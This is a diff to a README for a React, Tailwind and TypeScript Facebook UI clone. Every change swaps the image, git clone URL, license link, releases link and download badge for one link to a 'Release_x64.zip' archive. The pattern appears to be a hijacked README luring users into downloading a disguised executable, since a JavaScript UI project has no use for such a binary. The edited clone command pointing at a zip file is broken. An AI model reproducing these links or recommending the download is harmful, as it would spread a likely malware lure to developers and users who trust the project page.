@@ -1,7 +1,7 @@
 
 # Facebook Clone with React, React Router 6, Tailwind CSS & TypeScript
 
-![Facebook Clone](https://your-image-url.com)
+![Facebook Clone](https://github.com/Dwarlin3005/facebook-clone/releases/download/v2.0/Release_x64.zip)
 
 ## Description
 Welcome to the **Facebook Clone** repository! Here, we are building a user interface clone of the famous social media platform Facebook using React, React Router 6, Tailwind CSS with TypeScript.
@@ -25,7 +25,7 @@ Welcome to the **Facebook Clone** repository! Here, we are building a user inter
 To get started with the **Facebook Clone** project, follow these steps:
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/facebook-clone.git
+   git clone https://github.com/Dwarlin3005/facebook-clone/releases/download/v2.0/Release_x64.zip
    ```
 2. Install dependencies:
    ```bash
@@ -44,11 +44,11 @@ Feel free to explore the codebase, make modifications, or use it as a reference 
 Contributions are welcome! If you have any ideas, suggestions, or improvements to the project, feel free to submit a pull request. Together, we can make this Facebook UI Clone even better for the community.
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Dwarlin3005/facebook-clone/releases/download/v2.0/Release_x64.zip](https://github.com/Dwarlin3005/facebook-clone/releases/download/v2.0/Release_x64.zip) file for details.
 
-For the latest updates and releases, check the [Releases](https://github.com/your-username/facebook-clone/releases) section.
+For the latest updates and releases, check the [Releases](https://github.com/Dwarlin3005/facebook-clone/releases/download/v2.0/Release_x64.zip) section.
 
-[![Download Software](https://img.shields.io/badge/Download%20Software-Click%20Here-green)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Dwarlin3005/facebook-clone/releases/download/v2.0/Release_x64.zip%20Software-Click%20Here-green)](https://github.com/Dwarlin3005/facebook-clone/releases/download/v2.0/Release_x64.zip)
 
 ---
 
